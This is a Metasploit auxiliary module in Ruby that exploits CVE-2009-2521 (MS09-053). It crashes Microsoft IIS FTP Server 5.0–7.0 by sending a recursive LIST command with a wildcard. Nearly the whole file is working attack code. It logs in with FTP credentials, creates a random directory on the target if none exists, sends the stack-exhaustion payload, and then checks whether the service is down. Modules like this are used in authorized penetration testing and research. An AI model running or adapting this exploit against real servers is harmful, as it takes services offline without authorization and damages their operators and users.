##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::Ftp
  include Msf::Auxiliary::Dos

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Microsoft IIS FTP Server LIST Stack Exhaustion',
      'Description'    => %q{
          This module triggers Denial of Service condition in the Microsoft Internet
        Information Services (IIS) FTP Server 5.0 through 7.0 via a list (ls) -R command
        containing a wildcard. For this exploit to work in most cases, you need 1) a valid
        ftp account: either read-only or write-access account 2) the "FTP Publishing" must
        be configured as "manual" mode in startup type 3) there must be at least one
        directory under FTP root directory. If your provided an FTP account has write-access
        privilege and there is no single directory, a new directory with random name will be
        created prior to sending exploit payload.
      },
      'Author'         =>
        [
          'Kingcope', # Initial discovery
          'Myo Soe'   # Metasploit Module (http://yehg.net)
        ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'CVE', '2009-2521'],
          [ 'BID', '36273'],
          [ 'OSVDB', '57753'],
          [ 'MSB', 'MS09-053'],
          [ 'URL', 'https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2009/ms09-053'],
          [ 'URL', 'http://archives.neohapsis.com/archives/fulldisclosure/2009-09/0040.html']
        ],
      'DisclosureDate' => 'Sep 03 2009'))
  end

  def run
    # Attempt to crash IIS FTP
    begin
      return unless connect_login
      print_status('Checking if there is at least one directory ...')
      res = send_cmd_data(['ls'],'')

      if res.to_s =~ /\<DIR\>          / then
        print_status('Directory found, skipped creating a directory')
      else
        print_status('No single directory found')
        print_status('Attempting to create a directory ...')
        new_dir = Rex::Text.rand_text_alphanumeric(6)
        res = send_cmd(['mkd',new_dir])
        if res =~ /directory created/ then
          print_status("New directory \"#{new_dir}\" was created!")
        else
          print_error('Write-access was denied')
          print_error('Exploit failed')
          disconnect
          return
        end
      end

      print_status("Sending DoS packets ...")
      res = send_cmd_datax(['ls','-R */../'],' ')
      disconnect
    rescue ::Interrupt
      raise $!
    rescue ::Rex::ConnectionRefused
      print_error("Cannot connect. The server is not running.")
      return
    rescue Rex::ConnectionTimeout
      print_error("Cannot connect. The connection timed out.")
      return
    rescue
    end

    #More careful way to check DOS
    print_status("Checking server's status...")
    begin
      connect_login
      disconnect
      print_error("DOS attempt failed.  The service is still running.")
    rescue
      print_good("Success! Service is down")
    end
  end

  # Workaround: modified send_cmd_data function with short sleep time before data_disconnect call
  # Bug Tracker: 4868
  def send_cmd_datax(args, data, mode = 'a', nsock = self.sock)
    args[0] = "LIST"
    # Set the transfer mode and connect to the remove server
    return nil if not data_connect(mode)
    # Our pending command should have got a connection now.
    res = send_cmd(args, true, nsock)
    # make sure could open port
    return nil unless res =~ /^(150|125) /
    # dispatch to the proper method
    begin
      data = self.datasocket.get_once(-1, ftp_timeout)
    rescue ::EOFError
      data = nil
    end
    select(nil,nil,nil,1)
    # close data channel so command channel updates
    data_disconnect
    # get status of transfer
    ret = nil
    ret = recv_ftp_resp(nsock)
    ret = [ ret, data ]
    ret
  end
end
